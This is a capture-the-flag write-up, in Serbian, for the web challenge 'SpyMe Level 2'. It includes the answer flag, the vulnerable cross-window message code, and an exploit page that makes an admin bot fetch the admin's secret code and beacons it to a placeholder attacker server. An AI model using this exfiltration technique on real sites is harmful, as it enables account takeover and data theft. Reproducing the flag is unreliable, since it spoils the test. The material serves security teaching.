## Ime zadatka:

SpyMe Level 2


## Kategorija:

Web

## Deskripcija:

> Great job! You've infiltrated the system and retrieved information from the spies' accounts. However, they didn't leave anything spicy for us. Let's see if you can find the secret code for the spooky admin.


## Linkovi:

+ `source.zip` - [Download](https://github.com/CyberHeroRS/scc2025-warmup/raw/refs/heads/master/web_spyMe_level2/public/source.zip)

## Flag:

* `SCC{w0W_y0u_ar3_th3_g4Zd4_n0W!}`



## Napomene:

* Zameniti fake flagove unutar `docker-compose.yml` fajla.
* Staviti neke jace credentials za MySQL takodje unutar `docker-compose.yml` fajla.
* Koristiti istu instancu za sva 3 level-a zadatka.

## Writeup:

* Nakon logina kao agent, dobijamo mogucnost da koristimo "Spy on Someone" funkciju.

* U pitanju je admin bot koji posecuje *bilo koji* URL. 

* Ako pogledamo `/account` naci cemo sledeci **postMessage listener** koji je bez bilo koje origin validacije:

```js
 const messageHandler = async (event) => {
      if (event.data.type === 'FETCH_USER_INFO') {
        try {
          if (!event.data.userId) throw new Error('No user ID provided');
          const data = await fetchUserInfo(event.data.userId);
          const response = {
            type: 'USER_INFO_RESPONSE',
            data: data,
            error: null
          };
          (event.source || window.opener).postMessage(response, '*');
        } catch (err) {
          const errorResponse = {
            type: 'USER_INFO_RESPONSE',
            data: null,
            error: err.message
          };
          (event.source || window.opener).postMessage(errorResponse, '*');
        }
      } else if (event.data.type === 'USER_INFO_RESPONSE' && event.source === window) {
        if (event.data.error) {
          setError(event.data.error);
          setLoading(false);
        } else {
          setUserData(event.data.data);
          if (event.data.data.username === 'admin' || event.data.data.username === 'icvorovic') {
            try {
              const loginResponse = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                  username: event.data.data.username,
                  secretCode: event.data.data.secret_code
                })
              });
              const loginData = await loginResponse.json();
              if (loginData.flag) {
                setFlag(loginData.flag);
              }
            } catch (err) {
              console.error('Error fetching flag:', err);
            }
          }
          setLoading(false);
        }
      }
    };

    window.addEventListener('message', messageHandler);
```

* Uzima nas `userId` i poziva `fetchUserInfo()`:
```js
const fetchUserInfo = async (targetUserId) => {
      if (!targetUserId) return;
      
      try {
        const encodedId = Buffer.from(JSON.stringify({id: targetUserId})).toString('base64');
        const response = await fetch(`/api/account_info/${encodedId}`);
        if (!response.ok) {
          throw new Error('Failed to fetch user info');
        }
        return await response.json();
      } catch (error) {
        console.error('Error fetching user info:', error);
        throw error;
      }
    };
```

* Ova funkcija uzima response za bilo ciji nalog sa `/api/account_info/<id>` i vraca je nazad onom koji je inicirao postMessage, kroz `window.opener.postMessage`. 

* Ovo znaci da mozemo da ukrademo response sa ove API rute. Ukoliko pogledamo njen kod detaljnije, unutar kontrolera vidimo da ukoliko je user `admin`, ruta vraca takodje njegov secret code:

```js
const getAgentInfo = async (req, res) => {
    try {
        const decodedData = decodeBase64ToJson(req.params.id);
        const userId = parseInt(decodedData.id);
        
        if (isNaN(userId)) {
            return res.status(400).json({ error: 'Invalid user ID' });
        }

        const [rows] = await pool.execute(
            'SELECT id, first_name, last_name, username, secret_code, is_admin FROM users WHERE id = ?',
            [userId]
        );

        if (rows.length === 0) {
            return res.status(404).json({ error: 'User not found' });
        }

        const user = rows[0];
        
        if (user.username == "admin" && !req.user.is_admin) { // <- ovde je kljucni deo
            delete user.secret_code;
        }

        res.json(user);
    } catch (error) {
        console.error('Account info error:', error);
        res.status(500).json({ error: 'Failed to fetch account info' });
    }
};
```

* Ovo znaci da ukoliko nateramo admina da inicira postMessage, dobijamo njegov secret code i mozemo da se ulogujemo kao admin i da dobijemo flag.

* Exploit za ovo je unutar `checker/solve.html` fajla:
```html
<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<title>Exploit for SpyMe Level 2</title>
		<meta name="description" content="">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="">
		
	</head>
	<body>
        <h1>Exploit for SpyMe Level 2</h1>
		<script>
            
            EXPLOIT_SERVER_URL = "https://<EXPLOIT_SERVER_LISTENER>"; // make sure this is HTTPS 
            BASE_URL = "http://web:3000";

            exp_win = window.open(BASE_URL + "/account")
            setTimeout(() => {
                exp_message = {
                    type: "FETCH_USER_INFO",
                    userId: 1337 // <ADMIN_ID_FROM_LEVEL_1>
                };

                exp_win.postMessage(exp_message, "*");
            }, 4000);

            window.addEventListener("message", (event) => {
                navigator.sendBeacon(EXPLOIT_SERVER_URL + "/exfil", JSON.stringify(event.data))
            });
		</script>
	</body>
</html>
```

